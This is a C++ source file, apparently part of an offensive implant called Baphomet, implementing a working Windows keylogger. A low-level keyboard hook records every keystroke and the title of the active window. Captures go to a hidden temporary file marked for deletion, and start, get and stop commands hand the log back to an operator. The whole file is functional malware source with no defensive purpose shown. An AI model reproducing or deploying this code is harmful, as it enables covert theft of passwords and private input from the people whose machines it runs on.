//
// Created by diago on 2024-06-15.
//

#include <reconnaissance.hpp>

#ifndef BAPHOMET_USE_SLEEPMASK

HANDLE
recon::create_log_file() {

    char	temp_directory[MAX_PATH]   = { 0 };
    char	temp_path[MAX_PATH]        = { 0 };
    HANDLE      out                        = nullptr;

    //--------------------------------------------//

    if(!GetTempPathA(MAX_PATH, temp_directory)) {
        return nullptr;
    }

    if(!GetTempFileNameA(temp_directory, "BAP", 0, temp_path)) {
        return nullptr;
    }


    out = CreateFileA(
        temp_path,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if(out == INVALID_HANDLE_VALUE) {
    	DEBUG_PRINT("[!] Failed to create keylogger log file: %lu\n", GetLastError());
        return nullptr;
    }


    FILE_DISPOSITION_INFO dispos = { 0 };
    dispos.DeleteFile = TRUE;

    if(!SetFileInformationByHandle(out, FileDispositionInfo, &dispos, sizeof(dispos))) {
	DEBUG_PRINT("[!] Failed to mark log file for deletion: %lu\n", GetLastError());
	return nullptr;
    }

    return out;
}


bool
recon::interact_with_log_file(std::string &buffer, const keylog_action action) {

    static HANDLE   hlogfile        = nullptr;
    static HANDLE   hmutex          = CreateMutexA(nullptr, FALSE, nullptr);
    static bool	    trap	    = false;

    uint32_t        file_size       = 0;
    uint32_t        transferred     = 0;
    LARGE_INTEGER   li              = { 0 };

    //---------------------------------------------//


    WaitForSingleObject(hmutex, INFINITE);
    auto _ = defer([&]() {
        if(hmutex != nullptr) {
            ReleaseMutex(hmutex);
        }
    });

    if(trap && action == keylog_action::START) {
	trap = false;
	ReleaseMutex(hmutex);
	ExitThread(0);
     }

    if(hlogfile == nullptr) {
	hlogfile = create_log_file();
    }


    switch(action) {
        case keylog_action::GET:
            file_size = GetFileSize(hlogfile, nullptr);
            if(file_size == INVALID_FILE_SIZE || !file_size) {
            	DEBUG_PRINT("[!] Invalid logfile size.");
                return false;
            }

            li.QuadPart = 0;
            if(!SetFilePointerEx(hlogfile, li, nullptr, FILE_BEGIN)) {
            	return false;
            }

            buffer.resize(file_size);
            if(!ReadFile(
                hlogfile,
                buffer.data(),
                file_size,
                reinterpret_cast<LPDWORD>(&transferred),
                nullptr
            ) || transferred != file_size) {
            	DEBUG_PRINT("[!] ReadFile: %lu\n", GetLastError());
            	return false;
            }

    	    li.QuadPart = 0;
    	    if (!SetFilePointerEx(hlogfile, li, nullptr, FILE_END)) {
    		return false;
    	    }
            break;

        case keylog_action::START:
            if(!WriteFile(
                hlogfile,
                buffer.data(),
                buffer.size(),
                reinterpret_cast<LPDWORD>(&transferred),
                nullptr
            ) || transferred != buffer.size()) {
            	DEBUG_PRINT("[!] WriteFile: %lu\n", GetLastError());
                return false;
            }
            break;

        case keylog_action::STOP:
    	    trap = true;
    	    CloseHandle(hlogfile);
    	    hlogfile = nullptr;
            break;
    }

    return true;
}


LRESULT CALLBACK
recon::keyboard_proc(int ncode, WPARAM wparam, LPARAM lparam) {

        static bool shift_down	= false;
	static bool caps_lock	= false;
	bool   upcase		= false;
	HWND   hwindow		= nullptr;

	static std::string		last_window_title;
	std::string			window_title;
	std::string			buffer;

	auto* key = reinterpret_cast<PKBDLLHOOKSTRUCT>(lparam);

	//---------------------------------------------------------------------//

	//
	// Check if foreground window has changed
	//

	hwindow = GetForegroundWindow();

	if (hwindow) {
		int window_text_length = GetWindowTextLengthA(hwindow);

		if (window_text_length) {
			window_title.resize(window_text_length + 1);
			GetWindowTextA(hwindow, &window_title[0], window_text_length + 1);

			if (last_window_title != window_title) {
				buffer += "\n\n[";
				buffer += window_title;
				buffer += "]\n\n";

				last_window_title = window_title;
			}
		}
	}


	//
	// Determine whether this should be uppercase or not
	//

	if (!shift_down && !caps_lock) {
		upcase = false;
	} else if ((!shift_down && caps_lock) || (shift_down && !caps_lock)) {
		upcase = true;
	} else {
		upcase = false;
	}


	if (wparam == WM_KEYDOWN) {
		switch (key->vkCode) {

		case VK_CAPITAL:
			if (!caps_lock) {
				buffer += "<CAPS>";
				caps_lock = true;
			}

			else {
				buffer += "</CAPS>";
				caps_lock = false;
			}

			break;


		case VK_SHIFT:
			if (!shift_down) {
				buffer += "<SHIFT>";
				shift_down = true;
			}

			break;

		case 160:
			if (!shift_down) {
				buffer += "<SHIFT>";
				shift_down = true;
			}

			break;


		case VK_LCONTROL:	buffer += "<LCTRL>";	break;
		case VK_RCONTROL:	buffer += "<RCTRL>";	break;
		case VK_INSERT:		buffer += "<INSERT>";	break;
		case VK_END:		buffer += "<END>";	break;
		case VK_PRINT:		buffer += "<PRINT>";	break;
		case VK_DELETE:		buffer += "<DEL>";	break;
		case VK_BACK:		buffer += "<BK>";	break;
		case VK_LEFT:		buffer += "<LEFT>";	break;
		case VK_RIGHT:		buffer += "<RIGHT>";	break;
		case VK_UP:		buffer += "<UP>"; 	break;
		case VK_DOWN:		buffer += "<DOWN>";	break;
		case VK_RETURN:		buffer += "<ENTER>\n";	break;
		case VK_TAB:		buffer += "<TAB>\t";	break;


		case '1': buffer += (upcase ? '!' : '1'); break;
		case '2': buffer += (upcase ? '@' : '2'); break;
		case '3': buffer += (upcase ? '#' : '3');  break;
		case '4': buffer += (upcase ? '$' : '4');  break;
		case '5': buffer += (upcase ? '%' : '5');  break;
		case '6': buffer += (upcase ? '^' : '6');  break;
		case '7': buffer += (upcase ? '&' : '7'); break;
		case '8': buffer += (upcase ? '*' : '8'); break;
		case '9': buffer += (upcase ? '(' : '9'); break;
		case '0': buffer += (upcase ? ')' : '0'); break;
		case 0xba: buffer += (upcase ? ':' : ';'); break;
		case 0xbb: buffer += (upcase ? '+' : '='); break;
		case 0xbc: buffer += (upcase ? '<' : ','); break;
		case 0xbd: buffer += (upcase ? '_' : '-'); break;
		case 0xbe: buffer += (upcase ? '>' : '.'); break;
		case 0xbf: buffer += (upcase ? '?' : '/'); break;
		case 0xc0: buffer += (upcase ? '~' : '`'); break;
		case 0xdb: buffer += (upcase ? '{' : '['); break;
		case 0xdc: buffer += (upcase ? '|' : '\\'); break;
		case 0xdd: buffer += (upcase ? '}' : ']'); break;
		case 0xde: buffer += (upcase ? '\"' : '\''); break;

		default:
			if (upcase) {
				buffer += (char)(std::toupper(key->vkCode));
			}

			else {
				buffer += (char)(std::tolower(key->vkCode));
			}

			break;
		}
	}

	else if (wparam == WM_KEYUP) {
		if (key->vkCode == VK_SHIFT || key->vkCode == 160) {
			buffer += "</SHIFT>";
			shift_down = false;
		}
	}

	interact_with_log_file(buffer, keylog_action::START);
	return CallNextHookEx(nullptr, ncode, wparam, lparam);
}


unsigned long
recon::keylogger_thread_entry(void* unused) {

    MSG     msg  = { 0 };
    HHOOK   hook = nullptr;

    hook = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        keyboard_proc,
        GetModuleHandleW(nullptr),
        0
    );

    if(hook == nullptr) {
        return EXIT_FAILURE;
    }


    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnhookWindowsHookEx(hook);
	return EXIT_SUCCESS;
}

#endif // ifndef BAPHOMET_USE_SLEEPMASK


bool
recon::keylog(const keylog_action action, std::string &buffer) {

#ifdef BAPHOMET_USE_SLEEPMASK
    buffer = "This command is not supported with sleepmask enabled.";
    return false;
#else

    static HANDLE hkeylogger_thread = nullptr;

    switch(action) {
        case keylog_action::START:

            if(hkeylogger_thread != nullptr) {
                buffer = "keylogging has already started.";
                return false;
            }

    	    hkeylogger_thread = CreateThread(
		nullptr,
		0,
		keylogger_thread_entry,
		nullptr,
		0,
		nullptr
    	    );

    	    if(hkeylogger_thread == nullptr) {
		buffer = io::win32_failure("keylog", "CreateThread");
    		return false;
    	    }

	    buffer = "successfully started keylogger thread with TID: " + std::to_string(GetThreadId(hkeylogger_thread));
	    break;

        case keylog_action::GET:
            if(hkeylogger_thread == nullptr) {
        	buffer = "keylogging has not started.";
        	return false;
	    }

            if(!interact_with_log_file(buffer, keylog_action::GET)) {
        	buffer = "failed to retrieve logfile output.";
		return false;
            }
            break;

        case keylog_action::STOP:
            if(hkeylogger_thread == nullptr) {
                buffer = "keylogging has not started.";
                return false;
            }

    	    interact_with_log_file(buffer, keylog_action::STOP);
    	    CloseHandle(hkeylogger_thread);
    	    hkeylogger_thread = nullptr;

    	    buffer = "told keylogging thread to exit.";
    	    break;

        default:
            buffer = "unknown action type.";
            return false;
    }

    return true;

#endif //ifdef BAPHOMET_USE_SLEEPMASK
}


